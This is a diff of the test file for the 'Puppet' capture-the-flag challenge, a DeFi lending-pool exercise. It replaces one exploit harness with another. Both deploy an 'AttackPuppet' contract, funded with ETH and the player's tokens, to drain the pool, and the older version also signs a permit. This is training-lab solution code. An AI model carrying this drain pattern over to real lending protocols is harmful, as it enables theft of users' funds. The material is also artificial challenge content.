@@ -98,56 +98,17 @@ describe('[Challenge] Puppet', function () {
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
         // Connect to the contracts with the attackers wallet
-        const attackPool = lendingPool.connect(player);
-        const attackToken = token.connect(player);
-        const attackUniSwap = uniswapExchange.connect(player);
- 
-        // Helper function to get current token/eth balances
-        const logAttackerBalances = async (address, name) => {
-            const ethBal = await ethers.provider.getBalance(address);
-            const tokenBal = await attackToken.balanceOf(address);
- 
-            console.log(`ETH Balance of ${name}:`, ethers.utils.formatEther(ethBal));
-            console.log(`TKN Balance of ${name}:`, ethers.utils.formatEther(tokenBal));
-            console.log("")
-        }
- 
-        await logAttackerBalances(player.address, "attacker");
-        await logAttackerBalances(attackUniSwap.address, "uniswap");
-         
-        // Calculate contract address to generate signature
-        const contractAddr = ethers.utils.getContractAddress({
-            from: player.address,
-            nonce: await player.getTransactionCount()
-        });
-        // Sign permit
-        const result = await signERC2612Permit(
-            player,
-            attackToken.address,
-            player.address,
-            contractAddr,
-            PLAYER_INITIAL_TOKEN_BALANCE)
- 
- 
-        console.log("Deploying attacking contract");
-        const AttackPuppetFactory = await ethers.getContractFactory("AttackPuppet", player);
-        await AttackPuppetFactory.deploy(
-            PLAYER_INITIAL_TOKEN_BALANCE,
-            POOL_INITIAL_TOKEN_BALANCE,
-            result.deadline,
-            result.v,
-            result.r,
-            result.s,
-            attackUniSwap.address,
-            attackToken.address,
-            attackPool.address,
-            {
-                gasLimit: 1e7,
-                value:  utils.parseEther("24")
-            }
+        [,,this.player2] = await ethers.getSigners();
+
+
+        const AttackerContractFactory = await ethers.getContractFactory('AttackPuppet', this.player2);
+        this.attackerContract = await AttackerContractFactory.deploy(
+            token.address, uniswapExchange.address, lendingPool.address
         )
- 
-        await logAttackerBalances(player.address, "Player")
+
+        token.connect(player).transfer(this.attackerContract.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await this.attackerContract.attack({value: 11n * 10n ** 18n});
+        await token.connect(this.player2).transfer(player.address, await token.balanceOf(this.player2.address));
     });
 
     after(async function () {
